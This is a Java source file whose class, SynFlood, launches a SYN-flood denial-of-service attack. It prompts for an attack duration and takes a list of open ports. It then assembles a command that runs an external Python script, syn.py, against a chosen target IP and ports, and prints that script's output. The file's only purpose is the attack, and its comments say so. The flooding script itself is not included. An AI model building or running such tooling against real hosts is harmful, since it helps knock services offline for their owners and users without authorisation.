package Base;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

/**
 * Created by kenzi on 21/11/2016.
 */
public class SynFlood {

    // Perform SYN attack.
    public static void synAttack(String ip) {

        ArrayList<Integer> openPortList = GetData.getOpenPortArray();
        String attackPorts = setOpenPort(openPortList);

        System.out.println();
        System.out.println("How long do you want to attack [ input * min ]?");
        String attackDuration = String.valueOf(GetData.getInteger());

        String destinationIp = ip;

        String uri = getURI();
        String cmd =  "python " + uri + "/syn.py"
                + " -t " + destinationIp + " -d " + attackDuration + " " + attackPorts ;

        System.out.println(cmd); // for testing purpose

        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(cmd);

            BufferedReader in = new BufferedReader(new
                    InputStreamReader(p.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();

        } catch (IOException e) {
            System.out.println(e);
        }
    }

    public static String setOpenPort(ArrayList<Integer> chosenPorts){

        String result = "";

        for (int i = 0; i < chosenPorts.size() ; i++) {
            String cmd = "-a " + String.valueOf(chosenPorts.get(i) + " ");
            result += cmd;
        }

        return result;

    }

    public static String getURI() {
        String uri = System.getProperty("user.dir");
        System.out.println(uri);

        return uri;
    }

}
